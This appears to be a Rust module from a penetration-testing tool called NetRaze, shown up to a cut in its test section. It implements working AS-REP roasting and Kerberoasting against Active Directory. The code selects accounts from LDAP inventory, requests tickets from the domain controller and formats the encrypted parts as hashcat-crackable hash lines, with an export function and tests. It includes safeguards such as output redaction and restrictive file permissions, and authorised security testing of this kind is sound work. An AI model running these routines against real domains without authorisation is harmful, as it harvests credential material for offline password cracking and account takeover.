//! AS-REP and service-ticket assessment built on the bounded KDC client.

use std::collections::HashSet;
use std::io::{self, Write};
use std::path::Path;

use netraze_core::{
    DirectoryInventory, DirectoryPrincipalKind, KerberosFinding, KerberosFindingKind,
    KerberosTargetError,
};
use picky_asn1::bit_string::BitString;
use picky_asn1::date::GeneralizedTime;
use picky_asn1::wrapper::{
    Asn1SequenceOf, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2,
    ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5, ExplicitContextTag7,
    ExplicitContextTag8, GeneralizedTimeAsn1, OctetStringAsn1, Optional,
};
use picky_krb::constants::error_codes::KDC_ERR_PREAUTH_REQUIRED;
use picky_krb::constants::key_usages::{
    TGS_REP_ENC_SESSION_KEY, TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
    TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR_CKSUM,
};
use picky_krb::constants::types::{
    AP_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, PA_TGS_REQ_TYPE, TGS_REQ_MSG_TYPE,
};
use picky_krb::data_types::{
    ApOptions, Authenticator, AuthenticatorInner, Checksum, EncryptedData, KerberosFlags, PaData,
    Ticket,
};
use picky_krb::messages::{ApReq, ApReqInner, KdcReq, KdcReqBody, TgsRep, TgsReq};
use rand::rngs::OsRng;
use rand::{CryptoRng, Rng, RngCore};
use time::OffsetDateTime;

use super::client::{
    AsExchangeReply, build_as_req, decode_enc_kdc_rep_part, decode_kdc_reply, encode_der,
    encrypted_data_type, integer_as_i32, integer_as_u32, integer_i32, integer_u32, kdc_error,
    kerberos_string, principal, principal_name, validate_der_envelope, validate_username,
};
use super::crypto::keyed_checksum;
use super::{
    KerberosClient, KerberosEncryptionType, KerberosError, TicketGrantingTicket, decrypt, encrypt,
};

const TGS_REP_TAG: u8 = 0x6d;
const KRB_ERROR_TAG: u8 = 0x7e;
const MAX_ASSESSMENT_TARGETS: usize = 50_000;
const MAX_TARGET_LENGTH: usize = 1_024;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ServicePrincipalTarget {
    pub account: String,
    pub service_principal_name: String,
}

impl ServicePrincipalTarget {
    pub fn new(
        account: impl Into<String>,
        service_principal_name: impl Into<String>,
    ) -> Result<Self, KerberosError> {
        let target = Self {
            account: account.into(),
            service_principal_name: service_principal_name.into(),
        };
        validate_hash_field(&target.account, "account")?;
        validate_spn(&target.service_principal_name)?;
        Ok(target)
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct KerberosAssessmentTargets {
    pub as_rep_principals: Vec<String>,
    pub service_principals: Vec<ServicePrincipalTarget>,
}

impl KerberosAssessmentTargets {
    pub fn normalize(&mut self) -> Result<(), KerberosError> {
        if self.as_rep_principals.len() > MAX_ASSESSMENT_TARGETS
            || self.service_principals.len() > MAX_ASSESSMENT_TARGETS
        {
            return Err(KerberosError::InvalidMessage(format!(
                "Kerberos assessment is limited to {MAX_ASSESSMENT_TARGETS} targets per category"
            )));
        }
        for principal in &self.as_rep_principals {
            validate_username(principal)?;
            validate_hash_field(principal, "principal")?;
        }
        for target in &self.service_principals {
            validate_hash_field(&target.account, "account")?;
            validate_spn(&target.service_principal_name)?;
        }
        self.as_rep_principals
            .sort_by_key(|value| value.to_ascii_lowercase());
        self.as_rep_principals
            .dedup_by(|left, right| left.eq_ignore_ascii_case(right));
        self.service_principals.sort_by(|left, right| {
            left.service_principal_name
                .to_ascii_lowercase()
                .cmp(&right.service_principal_name.to_ascii_lowercase())
                .then_with(|| {
                    left.account
                        .to_ascii_lowercase()
                        .cmp(&right.account.to_ascii_lowercase())
                })
        });
        self.service_principals.dedup_by(|left, right| {
            left.service_principal_name
                .eq_ignore_ascii_case(&right.service_principal_name)
        });
        Ok(())
    }
}

/// Derive assessment candidates from the already-collected LDAP inventory.
#[must_use]
pub fn targets_from_inventory(inventory: &DirectoryInventory) -> KerberosAssessmentTargets {
    let mut targets = KerberosAssessmentTargets {
        as_rep_principals: inventory
            .users
            .items
            .iter()
            .filter(|user| user.does_not_require_preauth && !user.disabled)
            .map(|user| user.name.clone())
            .collect(),
        service_principals: inventory
            .services
            .items
            .iter()
            .filter(|service| {
                matches!(
                    service.kind,
                    DirectoryPrincipalKind::User | DirectoryPrincipalKind::ManagedServiceAccount
                )
            })
            .flat_map(|service| {
                service
                    .service_principal_names
                    .iter()
                    .map(|spn| ServicePrincipalTarget {
                        account: service.name.clone(),
                        service_principal_name: spn.clone(),
                    })
            })
            .collect(),
    };
    // LDAP values are already bounded by the LDAP client. If malformed values
    // appear, the assessment methods still validate them before network use.
    targets
        .as_rep_principals
        .sort_by_key(|value| value.to_ascii_lowercase());
    targets
        .as_rep_principals
        .dedup_by(|left, right| left.eq_ignore_ascii_case(right));
    let mut seen = HashSet::new();
    targets
        .service_principals
        .retain(|target| seen.insert(target.service_principal_name.to_ascii_lowercase()));
    targets.service_principals.sort_by_key(|target| {
        (
            target.service_principal_name.to_ascii_lowercase(),
            target.account.to_ascii_lowercase(),
        )
    });
    targets
}

/// Sensitive hash material paired with safe result metadata.
#[derive(Clone)]
pub struct RoastArtifact {
    pub finding: KerberosFinding,
    hashcat_line: String,
}

impl core::fmt::Debug for RoastArtifact {
    fn fmt(&self, formatter: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        formatter
            .debug_struct("RoastArtifact")
            .field("finding", &self.finding)
            .field("hashcat_line", &"[REDACTED]")
            .finish()
    }
}

impl RoastArtifact {
    #[must_use]
    pub fn hashcat_line(&self) -> &str {
        &self.hashcat_line
    }

    #[must_use]
    pub fn into_hashcat_line(self) -> String {
        self.hashcat_line
    }
}

/// Write explicitly requested Hashcat material to a newly truncated file.
/// Unix permissions are forced to owner-read/write because these lines are
/// credential-equivalent. Callers decide the path; assessments never export
/// artifacts implicitly.
pub fn export_roast_artifacts(path: &Path, artifacts: &[RoastArtifact]) -> io::Result<()> {
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    let mut file = options.open(path)?;
    #[cfg(unix)]
    std::fs::set_permissions(path, std::os::unix::fs::PermissionsExt::from_mode(0o600))?;
    for artifact in artifacts {
        writeln!(file, "{}", artifact.hashcat_line())?;
    }
    file.flush()
}

#[derive(Debug, Clone, Default)]
pub struct KerberosAssessmentOutcome {
    pub findings: Vec<KerberosFinding>,
    pub artifacts: Vec<RoastArtifact>,
    pub errors: Vec<KerberosTargetError>,
}

impl KerberosAssessmentOutcome {
    pub fn merge(&mut self, mut other: Self) {
        self.findings.append(&mut other.findings);
        self.artifacts.append(&mut other.artifacts);
        self.errors.append(&mut other.errors);
        self.findings.sort_by(|left, right| {
            left.principal
                .to_ascii_lowercase()
                .cmp(&right.principal.to_ascii_lowercase())
                .then_with(|| {
                    left.service_principal_name
                        .as_deref()
                        .unwrap_or_default()
                        .to_ascii_lowercase()
                        .cmp(
                            &right
                                .service_principal_name
                                .as_deref()
                                .unwrap_or_default()
                                .to_ascii_lowercase(),
                        )
                })
        });
        self.errors
            .sort_by_key(|error| error.target.to_ascii_lowercase());
    }
}

/// A validated service ticket. Ticket bytes and the service session key remain
/// private and are never serialized by NetRaze.
#[derive(Clone)]
pub struct ServiceTicket {
    pub(crate) ticket: Ticket,
    pub(crate) session_key: Vec<u8>,
    pub(crate) session_encryption_type: KerberosEncryptionType,
    pub(crate) client_principal: String,
    pub(crate) service_principal_name: String,
    pub(crate) realm: String,
    pub(crate) issued_at_unix: i64,
    pub(crate) valid_from_unix: i64,
    pub(crate) valid_until_unix: i64,
    pub(crate) renewable_until_unix: Option<i64>,
    pub(crate) ticket_flags: u32,
}

impl core::fmt::Debug for ServiceTicket {
    fn fmt(&self, formatter: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        formatter
            .debug_struct("ServiceTicket")
            .field("service_principal_name", &self.service_principal_name)
            .field("client_principal", &self.client_principal)
            .field("realm", &self.realm)
            .field("session_encryption_type", &self.session_encryption_type)
            .field("valid_until_unix", &self.valid_until_unix)
            .field("ticket_flags", &format_args!("{:#010x}", self.ticket_flags))
            .finish_non_exhaustive()
    }
}

impl ServiceTicket {
    #[must_use]
    pub fn service_principal_name(&self) -> &str {
        &self.service_principal_name
    }

    #[must_use]
    pub fn realm(&self) -> &str {
        &self.realm
    }

    #[must_use]
    pub const fn session_encryption_type(&self) -> KerberosEncryptionType {
        self.session_encryption_type
    }

    #[must_use]
    pub const fn valid_until_unix(&self) -> i64 {
        self.valid_until_unix
    }

    #[must_use]
    pub fn client_principal(&self) -> &str {
        &self.client_principal
    }

    #[must_use]
    pub const fn valid_from_unix(&self) -> i64 {
        self.valid_from_unix
    }

    #[must_use]
    pub const fn issued_at_unix(&self) -> i64 {
        self.issued_at_unix
    }

    #[must_use]
    pub const fn renewable_until_unix(&self) -> Option<i64> {
        self.renewable_until_unix
    }

    #[must_use]
    pub const fn ticket_flags(&self) -> u32 {
        self.ticket_flags
    }

    pub fn roast_artifact(&self, account: &str) -> Result<RoastArtifact, KerberosError> {
        validate_hash_field(account, "account")?;
        format_tgs_artifact(
            account,
            &self.service_principal_name,
            &self.realm,
            &self.ticket,
        )
    }
}

impl KerberosClient {
    /// Request an AS-REP without pre-authentication. `Ok(None)` means the KDC
    /// correctly required pre-authentication for the principal.
    pub async fn request_as_rep_roast(
        &self,
        principal_name: &str,
    ) -> Result<Option<RoastArtifact>, KerberosError> {
        let mut rng = OsRng;
        self.request_as_rep_roast_at(principal_name, OffsetDateTime::now_utc(), &mut rng)
            .await
    }

    async fn request_as_rep_roast_at<R: RngCore + CryptoRng>(
        &self,
        principal_name_value: &str,
        now: OffsetDateTime,
        rng: &mut R,
    ) -> Result<Option<RoastArtifact>, KerberosError> {
        validate_username(principal_name_value)?;
        validate_hash_field(principal_name_value, "principal")?;
        let nonce = rng.r#gen::<u32>() & 0x7fff_ffff;
        let request = build_as_req(
            &self.config.realm,
            principal_name_value,
            nonce,
            now,
            &[
                KerberosEncryptionType::Rc4Hmac,
                KerberosEncryptionType::Aes256CtsHmacSha196,
                KerberosEncryptionType::Aes128CtsHmacSha196,
            ],
            None,
        )?;
        let response = self.transport.exchange(&encode_der(&request)?).await?;
        match decode_kdc_reply(&response)? {
            AsExchangeReply::Error(error) if error.0.error_code.0 == KDC_ERR_PREAUTH_REQUIRED => {
                Ok(None)
            }
            AsExchangeReply::Error(error) => Err(kdc_error(error)),
            AsExchangeReply::AsRep(reply) => {
                let realm = reply.0.crealm.0.0.to_string();
                let principal = principal_name(&reply.0.cname.0);
                if !realm.eq_ignore_ascii_case(&self.config.realm)
                    || !principal.eq_ignore_ascii_case(principal_name_value)
                {
                    return Err(KerberosError::InvalidMessage(
                        "AS-REP roast reply does not match the requested principal".to_owned(),
                    ));
                }
                format_as_rep_artifact(&principal, &realm, &reply.0.enc_part.0).map(Some)
            }
        }
    }

    /// Acquire and validate one service ticket from a TGT.
    pub async fn request_service_ticket(
        &self,
        tgt: &TicketGrantingTicket,
        service_principal_name: &str,
    ) -> Result<ServiceTicket, KerberosError> {
        let mut rng = OsRng;
        self.request_service_ticket_at(
            tgt,
            service_principal_name,
            OffsetDateTime::now_utc(),
            &mut rng,
        )
        .await
    }

    async fn request_service_ticket_at<R: RngCore + CryptoRng>(
        &self,
        tgt: &TicketGrantingTicket,
        service_principal_name: &str,
        now: OffsetDateTime,
        rng: &mut R,
    ) -> Result<ServiceTicket, KerberosError> {
        validate_spn(service_principal_name)?;
        if !tgt.realm().eq_ignore_ascii_case(&self.config.realm) {
            return Err(KerberosError::InvalidMessage(
                "TGT realm does not match the configured KDC realm".to_owned(),
            ));
        }
        let nonce = rng.r#gen::<u32>() & 0x7fff_ffff;
        let request = build_tgs_req(tgt, service_principal_name, nonce, now, rng)?;
        let response = self.transport.exchange(&encode_der(&request)?).await?;
        let reply = decode_tgs_reply(&response)?;
        finish_tgs_exchange(reply, tgt, service_principal_name, nonce)
    }

    pub async fn assess_as_rep(
        &self,
        principals: &[String],
    ) -> Result<KerberosAssessmentOutcome, KerberosError> {
        let mut normalized = KerberosAssessmentTargets {
            as_rep_principals: principals.to_vec(),
            service_principals: Vec::new(),
        };
        normalized.normalize()?;
        let mut outcome = KerberosAssessmentOutcome::default();
        for principal in normalized.as_rep_principals {
            match self.request_as_rep_roast(&principal).await {
                Ok(Some(artifact)) => {
                    outcome.findings.push(artifact.finding.clone());
                    outcome.artifacts.push(artifact);
                }
                Ok(None) => {}
                Err(error) => outcome.errors.push(KerberosTargetError {
                    target: principal,
                    message: error.to_string(),
                }),
            }
        }
        Ok(outcome)
    }

    pub async fn assess_spns(
        &self,
        tgt: &TicketGrantingTicket,
        targets: &[ServicePrincipalTarget],
    ) -> Result<KerberosAssessmentOutcome, KerberosError> {
        let mut normalized = KerberosAssessmentTargets {
            as_rep_principals: Vec::new(),
            service_principals: targets.to_vec(),
        };
        normalized.normalize()?;
        let mut outcome = KerberosAssessmentOutcome::default();
        for target in normalized.service_principals {
            match self
                .request_service_ticket(tgt, &target.service_principal_name)
                .await
                .and_then(|ticket| ticket.roast_artifact(&target.account))
            {
                Ok(artifact) => {
                    outcome.findings.push(artifact.finding.clone());
                    outcome.artifacts.push(artifact);
                }
                Err(error) => outcome.errors.push(KerberosTargetError {
                    target: target.service_principal_name,
                    message: error.to_string(),
                }),
            }
        }
        Ok(outcome)
    }
}

fn build_tgs_req<R: RngCore + CryptoRng>(
    tgt: &TicketGrantingTicket,
    spn: &str,
    nonce: u32,
    now: OffsetDateTime,
    rng: &mut R,
) -> Result<TgsReq, KerberosError> {
    let components = spn.split('/').collect::<Vec<_>>();
    let service_name = principal(NT_SRV_INST, &components)?;
    let request_body = KdcReqBody {
        kdc_options: ExplicitContextTag0::from(KerberosFlags::from(BitString::with_bytes(vec![
            0x40, 0x81, 0x00, 0x00,
        ]))),
        cname: Optional::from(None),
        realm: ExplicitContextTag2::from(kerberos_string(tgt.realm())?),
        sname: Optional::from(Some(ExplicitContextTag3::from(service_name))),
        from: Optional::from(None),
        till: ExplicitContextTag5::from(GeneralizedTimeAsn1::from(GeneralizedTime::from(
            now + time::Duration::hours(10),
        ))),
        rtime: Optional::from(None),
        nonce: ExplicitContextTag7::from(integer_u32(nonce)),
        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![
            integer_i32(23),
            integer_i32(18),
            integer_i32(17),
        ])),
        addresses: Optional::from(None),
        enc_authorization_data: Optional::from(None),
        additional_tickets: Optional::from(None),
    };
    let request_body_der = encode_der(&request_body)?;
    let (checksum_type, checksum) = keyed_checksum(
        tgt.session_encryption_type,
        &tgt.session_key,
        TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR_CKSUM,
        &request_body_der,
    )?;
    let authenticator = Authenticator::from(AuthenticatorInner {
        authenticator_vno: ExplicitContextTag0::from(integer_i32(5)),
        crealm: ExplicitContextTag1::from(kerberos_string(tgt.realm())?),
        cname: ExplicitContextTag2::from(principal(NT_PRINCIPAL, &[tgt.client_principal()])?),
        cksum: Optional::from(Some(ExplicitContextTag3::from(Checksum {
            cksumtype: ExplicitContextTag0::from(integer_i32(checksum_type)),
            checksum: ExplicitContextTag1::from(OctetStringAsn1::from(checksum)),
        }))),
        cusec: ExplicitContextTag4::from(integer_u32(now.microsecond().min(999_999))),
        ctime: ExplicitContextTag5::from(GeneralizedTimeAsn1::from(GeneralizedTime::from(now))),
        subkey: Optional::from(None),
        seq_number: Optional::from(None),
        authorization_data: Optional::from(None),
    });
    let encrypted_authenticator = encrypt(
        tgt.session_encryption_type,
        &tgt.session_key,
        TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
        &encode_der(&authenticator)?,
        rng,
    )?;
    let ap_req = ApReq::from(ApReqInner {
        pvno: ExplicitContextTag0::from(integer_i32(5)),
        msg_type: ExplicitContextTag1::from(integer_i32(i32::from(AP_REQ_MSG_TYPE))),
        ap_options: ExplicitContextTag2::from(ApOptions::from(BitString::with_bytes(vec![0; 4]))),
        ticket: ExplicitContextTag3::from(tgt.ticket.clone()),
        authenticator: ExplicitContextTag4::from(EncryptedData {
            etype: ExplicitContextTag0::from(integer_i32(tgt.session_encryption_type.number())),
            kvno: Optional::from(None),
            cipher: ExplicitContextTag2::from(OctetStringAsn1::from(encrypted_authenticator)),
        }),
    });
    let pa_tgs_req = PaData {
        padata_type: ExplicitContextTag1::from(integer_i32(i32::from(PA_TGS_REQ_TYPE[0]))),
        padata_data: ExplicitContextTag2::from(OctetStringAsn1::from(encode_der(&ap_req)?)),
    };
    Ok(TgsReq::from(KdcReq {
        pvno: ExplicitContextTag1::from(integer_i32(5)),
        msg_type: ExplicitContextTag2::from(integer_i32(i32::from(TGS_REQ_MSG_TYPE))),
        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(vec![
            pa_tgs_req,
        ])))),
        req_body: ExplicitContextTag4::from(request_body),
    }))
}

fn decode_tgs_reply(bytes: &[u8]) -> Result<TgsRep, KerberosError> {
    validate_der_envelope(bytes)?;
    match bytes[0] {
        TGS_REP_TAG => picky_asn1_der::from_bytes(bytes)
            .map_err(|error| KerberosError::InvalidMessage(error.to_string())),
        KRB_ERROR_TAG => {
            let error = picky_asn1_der::from_bytes(bytes)
                .map_err(|decode| KerberosError::InvalidMessage(decode.to_string()))?;
            Err(kdc_error(error))
        }
        tag => Err(KerberosError::UnexpectedReply {
            expected: "TGS-REP or KRB-ERROR",
            actual: i32::from(tag & 0x1f),
        }),
    }
}

fn finish_tgs_exchange(
    reply: TgsRep,
    tgt: &TicketGrantingTicket,
    requested_spn: &str,
    nonce: u32,
) -> Result<ServiceTicket, KerberosError> {
    if integer_as_i32(&reply.0.msg_type.0) != Some(13)
        || !reply
            .0
            .crealm
            .0
            .0
            .to_string()
            .eq_ignore_ascii_case(tgt.realm())
        || !principal_name(&reply.0.cname.0).eq_ignore_ascii_case(tgt.client_principal())
    {
        return Err(KerberosError::InvalidMessage(
            "TGS-REP client identity does not match the TGT".to_owned(),
        ));
    }
    let reply_encryption_type = encrypted_data_type(&reply.0.enc_part.0)?;
    if reply_encryption_type != tgt.session_encryption_type {
        return Err(KerberosError::InvalidMessage(
            "TGS-REP encrypted part does not use the TGT session enctype".to_owned(),
        ));
    }
    let plaintext = decrypt(
        reply_encryption_type,
        &tgt.session_key,
        TGS_REP_ENC_SESSION_KEY,
        &reply.0.enc_part.0.cipher.0.0,
    )?;
    let encrypted_part = decode_enc_kdc_rep_part(&plaintext)?;
    if integer_as_u32(&encrypted_part.nonce.0) != Some(nonce)
        || !encrypted_part
            .srealm
            .0
            .0
            .to_string()
            .eq_ignore_ascii_case(tgt.realm())
        || !principal_name(&encrypted_part.sname.0).eq_ignore_ascii_case(requested_spn)
    {
        return Err(KerberosError::InvalidMessage(
            "TGS-REP service or nonce does not match the request".to_owned(),
        ));
    }
    let ticket_spn = principal_name(&reply.0.ticket.0.0.sname.0);
    let ticket_realm = reply.0.ticket.0.0.realm.0.0.to_string();
    if !ticket_spn.eq_ignore_ascii_case(requested_spn)
        || !ticket_realm.eq_ignore_ascii_case(tgt.realm())
    {
        return Err(KerberosError::InvalidMessage(
            "service ticket identity does not match the request".to_owned(),
        ));
    }
    let session_encryption_type = KerberosEncryptionType::from_number(
        integer_as_i32(&encrypted_part.key.0.key_type.0).ok_or_else(|| {
            KerberosError::InvalidMessage("invalid service session enctype".to_owned())
        })?,
    )?;
    let session_key = encrypted_part.key.0.key_value.0.0.clone();
    if session_key.len() != session_encryption_type.key_len() {
        return Err(KerberosError::InvalidKeyLength {
            encryption_type: session_encryption_type.name(),
            expected: session_encryption_type.key_len(),
            actual: session_key.len(),
        });
    }
    let issued_at_unix = OffsetDateTime::try_from(encrypted_part.auth_time.0.0.clone())
        .map_err(|error| KerberosError::InvalidMessage(error.to_string()))?
        .unix_timestamp();
    let valid_from_unix = encrypted_part.start_time.0.as_ref().map_or_else(
        || Ok(issued_at_unix),
        |value| {
            OffsetDateTime::try_from(value.0.0.clone())
                .map(|date| date.unix_timestamp())
                .map_err(|error| KerberosError::InvalidMessage(error.to_string()))
        },
    )?;
    let valid_until_unix = OffsetDateTime::try_from(encrypted_part.end_time.0.0.clone())
        .map_err(|error| KerberosError::InvalidMessage(error.to_string()))?
        .unix_timestamp();
    let renewable_until_unix = encrypted_part
        .renew_till
        .0
        .as_ref()
        .map(|value| {
            OffsetDateTime::try_from(value.0.0.clone())
                .map(|date| date.unix_timestamp())
                .map_err(|error| KerberosError::InvalidMessage(error.to_string()))
        })
        .transpose()?;
    let ticket_flags = super::client::kerberos_flags_as_u32(&encrypted_part.flags.0)?;
    Ok(ServiceTicket {
        ticket: reply.0.ticket.0,
        session_key,
        session_encryption_type,
        client_principal: tgt.client_principal.clone(),
        service_principal_name: ticket_spn,
        realm: ticket_realm,
        issued_at_unix,
        valid_from_unix,
        valid_until_unix,
        renewable_until_unix,
        ticket_flags,
    })
}

fn format_as_rep_artifact(
    principal: &str,
    realm: &str,
    encrypted: &EncryptedData,
) -> Result<RoastArtifact, KerberosError> {
    validate_hash_field(principal, "principal")?;
    validate_hash_field(realm, "realm")?;
    let encryption_type = encrypted_data_type(encrypted)?;
    let cipher = &encrypted.cipher.0.0;
    let (checksum, data) = split_roast_cipher(encryption_type, cipher)?;
    let finding = KerberosFinding {
        kind: KerberosFindingKind::AsRepRoast,
        principal: principal.to_owned(),
        service_principal_name: None,
        encryption_type: encryption_type.number(),
        hashcat_mode: hashcat_mode(KerberosFindingKind::AsRepRoast, encryption_type),
    };
    Ok(RoastArtifact {
        finding,
        hashcat_line: format!(
            "$krb5asrep${}${principal}@{realm}:{}${}",
            encryption_type.number(),
            hex(checksum),
            hex(data)
        ),
    })
}

fn format_tgs_artifact(
    account: &str,
    spn: &str,
    realm: &str,
    ticket: &Ticket,
) -> Result<RoastArtifact, KerberosError> {
    validate_hash_field(account, "account")?;
    validate_hash_field(realm, "realm")?;
    validate_spn(spn)?;
    let encrypted = &ticket.0.enc_part.0;
    let encryption_type = encrypted_data_type(encrypted)?;
    let (checksum, data) = split_roast_cipher(encryption_type, &encrypted.cipher.0.0)?;
    let spn_field = spn.replace(':', "~");
    let hashcat_line = match encryption_type {
        KerberosEncryptionType::Rc4Hmac => format!(
            "$krb5tgs$23$*{account}${realm}${spn_field}*${}${}",
            hex(checksum),
            hex(data)
        ),
        KerberosEncryptionType::Aes128CtsHmacSha196
        | KerberosEncryptionType::Aes256CtsHmacSha196 => format!(
            "$krb5tgs${}${account}${realm}$*{spn_field}*${}${}",
            encryption_type.number(),
            hex(checksum),
            hex(data)
        ),
    };
    Ok(RoastArtifact {
        finding: KerberosFinding {
            kind: KerberosFindingKind::Kerberoast,
            principal: account.to_owned(),
            service_principal_name: Some(spn.to_owned()),
            encryption_type: encryption_type.number(),
            hashcat_mode: hashcat_mode(KerberosFindingKind::Kerberoast, encryption_type),
        },
        hashcat_line,
    })
}

fn split_roast_cipher(
    encryption_type: KerberosEncryptionType,
    cipher: &[u8],
) -> Result<(&[u8], &[u8]), KerberosError> {
    match encryption_type {
        KerberosEncryptionType::Rc4Hmac if cipher.len() >= 24 => Ok(cipher.split_at(16)),
        KerberosEncryptionType::Aes128CtsHmacSha196
        | KerberosEncryptionType::Aes256CtsHmacSha196
            if cipher.len() > 12 =>
        {
            let split = cipher.len() - 12;
            Ok((&cipher[split..], &cipher[..split]))
        }
        _ => Err(KerberosError::CiphertextTooShort {
            encryption_type: encryption_type.name(),
            actual: cipher.len(),
        }),
    }
}

const fn hashcat_mode(kind: KerberosFindingKind, encryption_type: KerberosEncryptionType) -> u32 {
    match (kind, encryption_type) {
        (KerberosFindingKind::AsRepRoast, KerberosEncryptionType::Rc4Hmac) => 18_200,
        (KerberosFindingKind::AsRepRoast, KerberosEncryptionType::Aes128CtsHmacSha196) => 19_800,
        (KerberosFindingKind::AsRepRoast, KerberosEncryptionType::Aes256CtsHmacSha196) => 19_900,
        (KerberosFindingKind::Kerberoast, KerberosEncryptionType::Rc4Hmac) => 13_100,
        (KerberosFindingKind::Kerberoast, KerberosEncryptionType::Aes128CtsHmacSha196) => 19_600,
        (KerberosFindingKind::Kerberoast, KerberosEncryptionType::Aes256CtsHmacSha196) => 19_700,
    }
}

fn validate_hash_field(value: &str, label: &str) -> Result<(), KerberosError> {
    if value.is_empty()
        || value.len() > MAX_TARGET_LENGTH
        || value.contains(['$', '*', '\n', '\r', '\0'])
    {
        return Err(KerberosError::InvalidMessage(format!(
            "Kerberos {label} cannot be represented safely"
        )));
    }
    Ok(())
}

fn validate_spn(spn: &str) -> Result<(), KerberosError> {
    validate_hash_field(spn, "SPN")?;
    let components = spn.split('/').collect::<Vec<_>>();
    if components.len() < 2 || components.iter().any(|component| component.is_empty()) {
        return Err(KerberosError::InvalidMessage(
            "SPN must contain non-empty service and instance components".to_owned(),
        ));
    }
    if !spn.is_ascii() {
        return Err(KerberosError::InvalidMessage(
            "SPN must be ASCII".to_owned(),
        ));
    }
    Ok(())
}

fn hex(value: &[u8]) -> String {
    use core::fmt::Write;
    let mut output = String::with_capacity(value.len() * 2);
    for byte in value {
        write!(output, "{byte:02x}").expect("writing to String cannot fail");
    }
    output
}

#[cfg(test)]
mod tests {
    use super::*;
    use picky_asn1::wrapper::{ExplicitContextTag9, ExplicitContextTag10};
    use picky_krb::data_types::{EncryptionKey, LastReq, TicketInner};
    use picky_krb::messages::{EncKdcRepPart, EncTgsRepPart, KdcRep, TgsRep};

    #[test]
    fn formats_rc4_and_aes_hashcat_material_like_impacket() {
        let rc4 = EncryptedData {
            etype: ExplicitContextTag0::from(integer_i32(23)),
            kvno: Optional::from(None),
            cipher: ExplicitContextTag2::from(OctetStringAsn1::from(
                (0_u8..40).collect::<Vec<_>>(),
            )),
        };
        let artifact = format_as_rep_artifact("alice", "EXAMPLE.TEST", &rc4).unwrap();
        assert_eq!(artifact.finding.hashcat_mode, 18_200);
        assert_eq!(
            artifact.hashcat_line(),
            "$krb5asrep$23$alice@EXAMPLE.TEST:000102030405060708090a0b0c0d0e0f$101112131415161718191a1b1c1d1e1f2021222324252627"
        );

        let aes = ticket_with_cipher(18, (0_u8..40).collect());
        let artifact =
            format_tgs_artifact("svc-web", "HTTP/web.example.test:443", "EXAMPLE.TEST", &aes)
                .unwrap();
        assert_eq!(artifact.finding.hashcat_mode, 19_700);
        assert_eq!(
            artifact.hashcat_line(),
            "$krb5tgs$18$svc-web$EXAMPLE.TEST$*HTTP/web.example.test~443*$1c1d1e1f2021222324252627$000102030405060708090a0b0c0d0e0f101112131415161718191a1b"
        );
    }

    #[test]
    fn artifact_debug_and_safe_metadata_exclude_hash_material() {
        let ticket = ticket_with_cipher(23, vec![0x41; 40]);
        let artifact = format_tgs_artifact("svc", "HTTP/web", "EXAMPLE.TEST", &ticket).unwrap();
        let debug = format!("{artifact:?}");
        assert!(!debug.contains("414141"));
        assert!(debug.contains("REDACTED"));
        let serialized = serde_json::to_string(&artifact.finding).unwrap();
        assert!(!serialized.contains("414141"));
    }

    #[test]
    fn explicit_export_writes_artifacts_with_private_permissions() {
        let ticket = ticket_with_cipher(23, vec![0x41; 40]);
        let artifact = format_tgs_artifact("svc", "HTTP/web", "EXAMPLE.TEST", &ticket).unwrap();
        let path = std::env::temp_dir().join(format!(
            "netraze-kerberos-export-{}-{}.txt",
            std::process::id(),
            OffsetDateTime::now_utc().unix_timestamp_nanos()
        ));
        export_roast_artifacts(&path, std::slice::from_ref(&artifact)).unwrap();
        let written = std::fs::read_to_string(&path).unwrap();
        assert_eq!(written.trim(), artifact.hashcat_line());
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(
                std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
                0o600
            );
        }
        std::fs::remove_file(path).unwrap();
    }

    #[test]
    fn inventory_targets_exclude_disabled_users_and_computers() {
        let mut inventory = DirectoryInventory::default();
        inventory.users.items.extend([
            netraze_core::DirectoryUser {
                name: "asrep".to_owned(),
                does_not_require_preauth: true,
                ..Default::default()
            },
            netraze_core::DirectoryUser {
                name: "disabled".to_owned(),
                disabled: true,
                does_not_require_preauth: true,
                ..Default::default()
            },
        ]);
        inventory.services.items.extend([
            netraze_core::ServicePrincipal {
                name: "svc".to_owned(),
                kind: DirectoryPrincipalKind::User,
                service_principal_names: vec!["HTTP/web".to_owned()],
                ..Default::default()
            },
            netraze_core::ServicePrincipal {
                name: "DC1$".to_owned(),
                kind: DirectoryPrincipalKind::Computer,
                service_principal_names: vec!["HOST/dc1".to_owned()],
                ..Default::default()
            },
        ]);
        let targets = targets_from_inventory(&inventory);
        assert_eq!(targets.as_rep_principals, ["asrep"]);
        assert_eq!(targets.service_principals.len(), 1);
        assert_eq!(targets.service_principals[0].account, "svc");
    }

    #[test]
    fn normalization_is_case_insensitive_and_rejects_ambiguous_fields() {
        let mut targets = KerberosAssessmentTargets {
            as_rep_principals: vec!["Alice".to_owned(), "alice".to_owned()],
            service_principals: vec![
                ServicePrincipalTarget::new("svc", "HTTP/web").unwrap(),
                ServicePrincipalTarget::new("SVC", "http/WEB").unwrap(),
            ],
        };
        targets.normalize().unwrap();
        assert_eq!(targets.as_rep_principals.len(), 1);
        assert_eq!(targets.service_principals.len(), 1);
        assert!(ServicePrincipalTarget::new("bad$user", "HTTP/web").is_err());
        assert!(ServicePrincipalTarget::new("svc", "not-an-spn").is_err());
    }

    #[test]
    fn tgs_request_carries_decryptable_ap_req_authenticator() {
        let now = OffsetDateTime::from_unix_timestamp(1_700_000_000).unwrap();
        let tgt = test_tgt(now);
        let request =
